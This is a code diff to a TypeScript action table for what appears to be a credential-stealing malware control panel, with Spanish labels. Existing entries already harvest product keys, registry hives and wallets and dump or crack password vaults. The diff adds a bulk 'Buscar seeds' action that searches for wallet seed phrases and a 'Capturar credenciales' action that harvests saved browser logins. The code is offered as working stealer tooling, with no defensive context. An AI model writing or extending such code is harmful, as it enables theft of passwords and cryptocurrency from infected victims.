@@ -155,6 +155,8 @@ export const ACTIONS: ActionDef[] = [
   { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', windowsOnly: true, detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
   { id: 'hives', group: 'credenciales', label: 'Hives del registro', icon: FileText, task: 'agent', detail: 'agent · hives', windowsOnly: true, resolve: () => agent('hives', 180) },
   { id: 'scan', group: 'credenciales', label: 'Escanear wallets', icon: Wallet, task: 'scan_wallets', detail: 'scan_wallets · opciones', dialog: 'scan_wallets', bulk: true, local: true },
+  { id: 'find-seeds', group: 'credenciales', label: 'Buscar seeds', icon: FileSearch, task: 'scan_wallets', detail: 'scan_wallets · solo seeds', bulk: true, resolve: () => task('scan_wallets', { include_desktop: false, include_extensions: false, include_seeds: true }, 300) },
+  { id: 'credentials-capture', group: 'credenciales', label: 'Capturar credenciales', icon: KeyRound, task: 'harvest', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
   { id: 'dump', group: 'credenciales', label: 'Extraer vault', icon: Archive, task: 'dump_vault', detail: 'dump_vault · {target}', dialog: 'dump_vault', local: true },
   { id: 'crack', group: 'credenciales', label: 'Romper vault', icon: KeyRound, task: 'crack_vault', detail: 'crack_vault · {target,max_seconds}', dialog: 'crack_vault', local: true },
 
